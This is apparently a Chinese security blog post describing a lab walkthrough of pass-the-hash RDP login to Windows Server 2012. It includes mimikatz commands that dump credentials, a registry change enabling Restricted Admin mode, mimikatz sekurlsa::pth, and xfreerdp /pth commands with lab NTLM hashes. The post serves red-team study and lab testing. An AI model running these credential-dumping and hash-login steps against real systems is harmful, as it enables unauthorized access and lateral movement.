#  kali下利用FreeRDP进行hash登录远程桌面

原创 crow  [ 乌鸦安全 ](javascript:void\(0\);)

**乌鸦安全** ![]()

微信号 crowsec

功能介绍 专注于网络安全技术分享，红蓝对抗技术、免杀、反制、内网漫游、安全研究。

____

___发表于_

收录于合集 #乌鸦安全工具 51个

✎ 阅读须知  

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经允许，禁止转载！

本文所提供的工具仅用于学习，禁止用于其他，请在24小时内删除工具文件！！！

  

更新时间：2023年07月23日

# 1\. 背景介绍

在很多情况下，拿不到明文密码，由于对方机器是`win2012`的话，可以尝试使用`hash`登录`RDP`，看下桌面有什么东西。`hash`登录`RDP`其实有两个版本：

  * `Windows`版，本地用`mimikatz`来配合登录
  * `linux`版，用类似于`FreeRDP`这样的工具`pth`登录`RDP`

### 1.1 Windows版

但很多情况下，如果在`Windows`下`proxifier`代理有问题的时候，就会发现无论如何设置，`hash`登录`rdp`的流量就是走不了代理，这如果机器本身就在外网的话，会暴露自己的真实`ip`，如果在内网的话，基本上就是登录不成功。比如下面的：

![]()![]()

### 1.2 linux版

好消息是`linux`版可以使用`FreeRDP`这样的工具进行登录，坏消息是在早期网上说`FreeRDP`已经被移除了，新版本`FreeRDP`已经移除了该模块，但是作者给出了旧版本的文件，我们可以自行编译该模块进行使用。https://www.secpulse.com/archives/72190.html![]()

不过这个文章是`18`年的，好消息是目前新版`FreeRDP`又又又把功能加回来了，但变化是参数执行方式发生了一些微调：![]()

本来想着自己用老版本编译一下看看的，但是新版已经支持了，本文就来操作看下。

# 2.环境准备

### 2.1 拓扑介绍

在这里分别采用：

  * `Windows2012`  `192.168.135.133`
    
        被登录机器，只提供`hash`值，该环境已经关闭了防火墙，`3389`默认开启  
    

  * `Windows10` `2016长期服务版`   `192.168.135.168`
    
        登录`Windows2012`，验证`hash`登录是否能够成功  
    

  * `Windows server2019`    `192.168.135.136`

登录`Windows server2012`备用机器

  * `kali linux`  `192.168.135.138`
    
        采用`FreeRDP`登录`winserver2012`  
    

![]()image.png

### 2.2 环境准备

在这里先把`hash`拿到，由于在本地，直接用`mimikatz`获取`winserver2012`的`hash`值：

    
    
    mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt  
    

![]()image.png

在这里就获得了当前用户`crow`的`hash`信息：

    
    
      [00000003] Primary  
      * Username : crow  
      * Domain   : WIN-OE76K6VTLBR  
      * NTLM     : 570a9a65db8fba761c1008a51d4c95ab  
      * SHA1     : 759e689a07a84246d0b202a80f5fd9e335ca5392  
    

在这里需要继续设置，才可以进行`hash`登录：

    
    
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f  
    

1![]()

查看是否已开启 `DisableRestrictedAdmin `REG_DWORD 0x0 `存在就是开启：

    
    
    REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"  
    

![]()image.png

此时已开启。此时用`win10`来登录测试下：当前`winserver2012`的信息：

    
    
     192.168.135.133  
      
    [00000003] Primary  
      * Username : crow  
      * Domain   : WIN-OE76K6VTLBR  
      * NTLM     : 570a9a65db8fba761c1008a51d4c95ab  
      * SHA1     : 759e689a07a84246d0b202a80f5fd9e335ca5392  
    

在`Windows10`上用`mimikatz`来进行`hash`登录的命令：

    
    
    privilege::debug  
      
    sekurlsa::pth /user:crow /domain:WIN-OE76K6VTLBR /ntlm:570a9a65db8fba761c1008a51d4c95ab "/run:mstsc.exe /restrictedadmin"  
    

![]()image.png

此时`win10`上出现了这个问题：

    
    
    出现身份验证错误。  
    要求的函数不受支持  
    元程计算机: 192.168.135.133  
    这可能是由于 CredsSP 加密 Oracle 修iE若要了解详细信息，请访问 https://go.microsoft.com/fwlink/?linkid=866660  
    

这个我看到网上有非常多的方法，在攻防中遇到过好多次，最好的方法就是换一个客户端去连接，在这使用`Windows server2019`来连接：

![]()image.png

到这里就可以证明环境是没有问题的，接下来就看`kali`了。

# 3\. kali下的FreeRDP

看下当前`FreeRDP`的版本：

![]()image.png

此时如果用明文登录的话，命令应该是这样的：

    
    
    xfreerdp /u:crow /p:Admin@123 /v:192.168.135.133:3389  
    

`xfreerdp`的命令改动非常大，网上好多教程命令都对不上了，但是用这种方法登录的话，会遇到问题：

![]()image.png

    
    
    [10:59:55:669] [40228:40229] [ERROR][com.freerdp.core] - transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]  
    

通过查阅资料得知：https://github.com/FreeRDP/FreeRDP/issues/6544加上`/tls-seclevel:0
/timeout:80000`参数就可以了：

    
    
    xfreerdp /u:crow /p:Admin@123 /v:192.168.135.133:3389 /tls-seclevel:0 /timeout:80000  
    

![]()image.png

如果此时试试用`hash`登录了，因为新版里面好像有`hash`的选项：

![]()image.png

    
    
    xfreerdp /pth:570a9a65db8fba761c1008a51d4c95ab /v:192.168.135.133:3389 /tls-seclevel:0 /timeout:80000  
    

![]()image.png

根据提示，用用户名`crow`：

    
    
    xfreerdp /pth:570a9a65db8fba761c1008a51d4c95ab /u:crow /v:192.168.135.133:3389 /tls-seclevel:0 /timeout:80000  
    

![]()image.png

直接成功。

# 4\. FreeRDP的用处

在`Linux`上用`FreeRDP`进行`hash`登录操作，主要还是因为代理的问题，因为我有授权的攻防中，在登陆某些公网机器的时候，不想泄露自己的真实`ip`，需要套一层，虽然我在其他的虚拟机里面可以用代理走`3389`了，但是这里面还存在一个`rdp`反制的问题，后面有机会和大家分享一下。本来想学习下老版本`FreeRDP`的编译知识，来支持下`pth`的，但是新版又给加回来了，所以本文就到此。

tips：加我wx，拉你入群，一起学习

  

![]()

  

![]()

![]()![]()

扫取二维码获取

更多精彩

乌鸦安全

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

